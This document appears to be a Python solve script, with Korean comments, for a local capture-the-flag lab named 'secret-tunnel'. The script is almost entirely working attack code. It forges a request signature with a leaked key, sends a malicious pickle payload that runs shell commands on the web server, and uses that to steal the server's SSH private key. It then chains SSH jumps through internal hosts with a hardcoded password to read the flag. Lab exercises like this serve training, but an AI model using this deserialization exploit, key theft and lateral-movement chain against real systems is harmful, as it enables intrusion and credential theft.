#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
secret-tunnel — 또 다른 풀이: 클라이언트에서 이중 ProxyJump (역직렬화 RCE 는 키 유출에만 사용)
  대상 web   http://localhost:8090   (pickle RCE)
  대상 ssh   localhost:2222          (extserver appuser, compose 가 publish)

[아이디어]
  기존 풀이(SOLUTIONS.md)는 모든 ssh 를 extserver 내부(RCE)에서 돌리지만,
  extserver 의 2222(ssh)가 호스트로 publish 되어 있으므로 id_rsa 만 빼내면
  그 다음부터는 "내 PC 의 ssh 로 두 번 점프(-J)" 만으로 flag 까지 도달한다.

    내 PC --(id_rsa)--> appuser@extserver:2222 --(id_rsa)--> ctfuser@intserver --(비번)--> flaguser@flagserver
                          pubkey                    pubkey(제약셸이지만 -J=-W 라 무관)         password

  - id_rsa 하나로 1·2 홉 모두 인증(appuser/ctfuser 의 authorized_keys 가 동일 공개키).
  - ssh -J 는 내부적으로 -W(stdio 포워딩) → ctfuser 제약셸을 실행하지 않음(쉘 우회).
  - intserver/flagserver 이름은 각 직전 홉에서 resolve → 내 PC 가 내부망 이름을 몰라도 됨.
  - 마지막 flaguser@flagserver 만 비번. 내 터미널엔 tty 가 있어 그냥 입력 가능
    (sshpass 있으면 자동, 없으면 SSH_ASKPASS 헬퍼로 자동, 둘 다 없으면 수동 입력 안내).

실행:  python secret_tunnel_jump.py [WEB_URL] [SSH_HOST] [SSH_PORT]
       예) python secret_tunnel_jump.py http://localhost:8090 127.0.0.1 2222
       (먼저 docker compose 로 secret-tunnel 3 컨테이너가 떠 있어야 함)
주의:  ssh/-J·sshpass 는 POSIX(Linux/macOS/WSL/git-bash) 환경 기준.
"""
import os, sys, re, stat, base64, pickle, hashlib, shutil, tempfile, subprocess
import urllib.request, urllib.parse

WEB  = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8090"
HOST = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
PORT = sys.argv[3] if len(sys.argv) > 3 else "2222"

KEY      = "very_secret_key_do_not_guess"           # extserver 하드코딩 서명키
PASSWORD = "secretpassword1!"                        # flagserver flaguser 비번(소스 확인)
KEYPATH  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "id_rsa")


def rce(cmd, timeout=30):
    """위조서명 + pickle RCE. 명령 출력이 "Processed data: b'...'" 형태로 반환된다."""
    full = "(" + cmd + ") 2>&1; true"                # 비0 종료→500 방지 + stderr 회수
    class E:
        def __reduce__(self):
            return (subprocess.check_output, (['sh', '-c', full],))
    data = base64.b64encode(pickle.dumps(E())).decode()   # 'pickle' 문자열 미포함 → 필터 통과
    sig  = hashlib.md5((data + KEY).encode()).hexdigest()
    body = urllib.parse.urlencode({"data": data, "signature": sig}).encode()
    return urllib.request.urlopen(WEB + "/process", body, timeout=timeout).read().decode()


def leak_id_rsa():
    """RCE 로 appuser 의 개인키를 base64 로 받아 ./id_rsa 로 저장(개행 깨짐 방지)."""
    out = rce("base64 /home/appuser/.ssh/id_rsa | tr -d '\\n'")
    m = re.search(r"b'([A-Za-z0-9+/=]+)'", out)
    if not m:
        print("[-] id_rsa 유출 실패 — 응답:", out[:200].strip())
        return False
    with open(KEYPATH, "wb") as f:
        f.write(base64.b64decode(m.group(1)))
    try:
        os.chmod(KEYPATH, stat.S_IRUSR | stat.S_IWUSR)    # 600 (POSIX, ssh 가 키 권한 검사)
    except OSError:
        pass
    print("[*] id_rsa 저장:", KEYPATH)
    return True


def ssh_argv():
    """내 PC 의 ssh 로 extserver→intserver 두 번 점프 후 flagserver 에서 flag 읽기."""
    return [
        "ssh", "-i", KEYPATH,
        "-o", "IdentitiesOnly=yes",                  # 키 1개만 시도 → flagserver 비번 fallback
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=8",
        "-o", "LogLevel=ERROR",
        "-J", "appuser@%s:%s,ctfuser@intserver" % (HOST, PORT),
        "flaguser@flagserver",
        "cat /home/flaguser/flag.txt",
    ]


def manual_cmd():
    return (
        "sshpass -p '%s' \\\n"
        "ssh -i '%s' -o IdentitiesOnly=yes \\\n"
        "    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\\n"
        "    -J appuser@%s:%s,ctfuser@intserver \\\n"
        "    flaguser@flagserver 'cat /home/flaguser/flag.txt'"
        % (PASSWORD, KEYPATH, HOST, PORT)
    )


def run_double_jump():
    """비번 입력: sshpass → SSH_ASKPASS 헬퍼 순으로 자동 처리(둘 다 없으면 None)."""
    argv = ssh_argv()
    env = dict(os.environ)

    if shutil.which("sshpass"):
        print("[*] sshpass 로 비번 자동 입력")
        return subprocess.run(["sshpass", "-p", PASSWORD] + argv,
                              env=env, capture_output=True, text=True)

    # sshpass 가 없으면 SSH_ASKPASS 헬퍼로 자동 입력(OpenSSH 8.4+, POSIX)
    ap = tempfile.NamedTemporaryFile("w", suffix=".sh", delete=False)
    ap.write("#!/bin/sh\necho %s\n" % PASSWORD)
    ap.close()
    os.chmod(ap.name, 0o700)
    env.update(SSH_ASKPASS=ap.name, SSH_ASKPASS_REQUIRE="force", DISPLAY="x")
    print("[*] SSH_ASKPASS 헬퍼로 비번 자동 입력")
    try:
        return subprocess.run(argv, env=env, capture_output=True, text=True,
                              stdin=subprocess.DEVNULL)
    finally:
        os.unlink(ap.name)


def main():
    if not shutil.which("ssh"):
        print("[-] ssh 클라이언트를 찾을 수 없음(POSIX 환경 권장).")
        if leak_id_rsa():
            print("\n[i] 키는 유출됨. 아래를 직접 실행하세요:\n" + manual_cmd())
        return 1

    if not leak_id_rsa():
        return 1

    r = run_double_jump()
    out = (r.stdout or "") + (r.stderr or "")
    m = re.search(r"flag\{[^}]+\}", out)
    if m:
        print("[+] FLAG (secret-tunnel):", m.group(0))
        return 0

    print("[-] flag 추출 실패 — ssh 출력:\n", out.strip()[:500])
    print("\n[i] 수동 실행(비번: %s):\n%s" % (PASSWORD, manual_cmd()))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
